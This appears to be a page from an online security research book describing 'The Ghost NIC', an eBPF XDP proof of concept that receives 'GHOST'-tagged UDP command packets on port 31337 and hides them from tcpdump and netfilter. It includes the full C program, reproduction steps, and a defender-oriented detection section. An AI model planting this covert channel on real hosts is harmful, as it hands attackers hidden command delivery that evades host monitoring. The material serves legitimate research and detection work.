---
layout: book
title: "The Ghost NIC"
date: 2025-02-04
poc_dir: dBPF-pocs/pocs/ch05b-ghost-nic
---

# The Ghost NIC

> **See also**: [Full investigation notes in the book]({{ site.baseurl }}/book/act-1/chapter-5-the-ghost-nic.html) · [POC source](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05b-ghost-nic)

XDP runs before the packet reaches the IP stack. That single fact is the whole primitive: an XDP program attached to a netdev sees every ingress frame before netfilter, before raw sockets, before `tcpdump`'s AF_PACKET tap, and can return `XDP_DROP` to make the packet vanish from everyone above it.

My first attempt was `cls_bpf` on ingress tc. On the same interface, AF_PACKET still saw the frames — tc ingress is above the raw socket in the ingress path on every kernel I tested. Moved to XDP; the frames stopped appearing on tcpdump. This isn't a bypass of a security control; it's XDP doing exactly what the architecture documents.

## Mechanism

```c
SEC("xdp")
int xdp_ghost(struct xdp_md *ctx) {
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *iph = (void *)(eth + 1);
    if ((void *)(iph + 1) > data_end) return XDP_PASS;
    if (iph->protocol != IPPROTO_UDP) return XDP_PASS;

    struct udphdr *udp = (void *)iph + (iph->ihl * 4);
    if ((void *)(udp + 1) > data_end) return XDP_PASS;
    if (udp->dest != bpf_htons(31337)) return XDP_PASS;

    char *payload = (void *)(udp + 1);
    if (payload + 5 > (char *)data_end) return XDP_PASS;
    if (__builtin_memcmp(payload, "GHOST", 5) != 0) return XDP_PASS;

    char cmd[48] = {};
    long copy_len = (char *)data_end - (payload + 5);
    if (copy_len > 47) copy_len = 47;
    bpf_probe_read_kernel(cmd, copy_len, payload + 5);

    struct evt e = { .src_ip = iph->saddr, .sport = udp->source };
    __builtin_memcpy(e.cmd, cmd, 48);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);

    return XDP_DROP;
}
```

Bounds checks at every layer — the verifier rejects anything less. `bpf_xdp_adjust_head` and `bpf_redirect_map` are available for the cross-namespace variant (see [chapter 15]({{ site.baseurl }}/book/act-3/chapter-15-netns-vlan-ghost.html)).

## Hook point

- `SEC("xdp")` attached to a veth (drv-mode, fallback to skb-mode).

Loader attaches via `bpf_set_link_xdp_fd(ifindex, prog_fd, flags)`. Visible in `bpftool net show` and `ip link show <if>` with `xdp prog_id`.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch05b-ghost-nic
make
sudo bash trigger.sh
# BEFORE: tcpdump on veth_host captures both magic UDP packets
# AFTER: tcpdump captures 0; ringbuf shows 2 DROPPED events with cmd strings
# expect: === GHOST_COVERT_CHANNEL_PROVEN dropped=2 tcpdump=0 ===
```

## Detection

- `bpftool net show` lists every netdev with an XDP program attached.
- `ip link show <if>` shows the `xdp prog_id` field.
- An unexpected XDP attachment on a veth is the strongest signal — containers don't usually need XDP on their own interfaces.
- `bpftool prog show id <id> --pretty` gives the BTF and loader identity.
- `bpftrace` one-liners on `bpf_prog_load` will catch the attach in real time if `bpftrace` itself is allowed (it needs CAP_BPF — so it's an attacker-equivalent tool).

## Scope

Class IV primitive from chapter 20. This isn't a netfilter bypass in the sense of evading a rule; it's an architectural layer below netfilter, by design. Defenders who rely on `tcpdump`, nftables, or raw sockets for host-level visibility into covert channels need a second signal: XDP program inventory, CAP_BPF audit, and off-host network telemetry.

---

**Related material**

- Full chapter: [Chapter 5 — The Ghost NIC]({{ site.baseurl }}/book/act-1/chapter-5-the-ghost-nic.html)
- Cross-namespace variant: [Chapter 15 — NetNS VLAN Ghost]({{ site.baseurl }}/book/act-3/chapter-15-netns-vlan-ghost.html)
- POC source: [dBPF-pocs/pocs/ch05b-ghost-nic/](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05b-ghost-nic)
- Harness entry: search for `Poc("ch05b", ...)` in `dBPF-pocs/harness/proof.py`
